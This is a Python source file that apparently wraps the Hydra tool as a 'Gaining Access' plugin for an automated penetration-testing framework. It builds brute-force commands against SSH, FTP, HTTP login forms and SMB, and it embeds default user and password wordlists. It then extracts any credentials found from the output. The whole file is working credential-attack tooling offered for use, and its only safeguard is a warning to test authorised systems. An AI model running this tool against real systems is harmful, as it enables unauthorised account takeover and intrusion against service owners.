"""
Phase 3 — Gaining Access
Hydra: credential bruteforce against login services
Supports SSH, FTP, HTTP, RDP, SMB etc.
Requires: hydra (apt install hydra)
IMPORTANT: Only use against systems you have explicit permission to test.
"""
import subprocess


# Small default wordlists embedded — replace with rockyou.txt for real engagements
DEFAULT_USERS = ["admin", "root", "administrator", "user", "test", "guest"]
DEFAULT_PASSWORDS = [
    "password", "123456", "admin", "root", "test", "guest",
    "password123", "letmein", "welcome", "qwerty", "abc123"
]


class Hydra:
    def __init__(self):
        self.name = "hydra_bruteforce"
        self.description = (
            "Gaining access: bruteforce credentials against a service (ssh, ftp, http-post-form, smb). "
            "Only use on systems you are authorised to test."
        )

    def execute(
        self,
        target: str,
        service: str = "ssh",
        port: int = None,
        userlist: str = "",
        passlist: str = "",
        username: str = "",
        password: str = "",
        http_form_path: str = "/login",
        http_form_params: str = "username=^USER^&password=^PASS^:Invalid"
    ) -> str:
        try:
            import tempfile, os

            # Build user/pass args
            user_args = []
            pass_args = []

            if username:
                user_args = ["-l", username]
            elif userlist:
                user_args = ["-L", userlist]
            else:
                tmp_u = tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False)
                tmp_u.write("\n".join(DEFAULT_USERS))
                tmp_u.close()
                user_args = ["-L", tmp_u.name]

            if password:
                pass_args = ["-p", password]
            elif passlist:
                pass_args = ["-P", passlist]
            else:
                tmp_p = tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False)
                tmp_p.write("\n".join(DEFAULT_PASSWORDS))
                tmp_p.close()
                pass_args = ["-P", tmp_p.name]

            # Build command
            cmd = ["hydra"] + user_args + pass_args + ["-t", "4", "-f"]

            if port:
                cmd += ["-s", str(port)]

            if service == "http-post-form":
                cmd += [target, f"http-post-form", f"{http_form_path}:{http_form_params}"]
            else:
                cmd += [f"{service}://{target}"]

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            output = result.stdout.strip()

            # Clean up temp files
            for tmp_file in [tmp_u.name if not username and not userlist else None,
                             tmp_p.name if not password and not passlist else None]:
                if tmp_file:
                    try:
                        os.unlink(tmp_file)
                    except Exception:
                        pass

            if "[DATA]" in output or "login:" in output.lower():
                # Extract found credentials
                found_lines = [l for l in output.split("\n") if "login:" in l.lower() or "[22]" in l or "[21]" in l]
                if found_lines:
                    return f"Credentials found on {target}:\n" + "\n".join(found_lines)

            if "0 valid password" in output or "No results" in output:
                return f"No valid credentials found on {target} ({service})"

            return f"Hydra output for {target}:\n{output[:1500]}"

        except subprocess.TimeoutExpired:
            return "Hydra timeout (120s)"
        except FileNotFoundError:
            return "Error: hydra not installed. Run: apt install hydra"
        except Exception as e:
            return f"Error: {e}"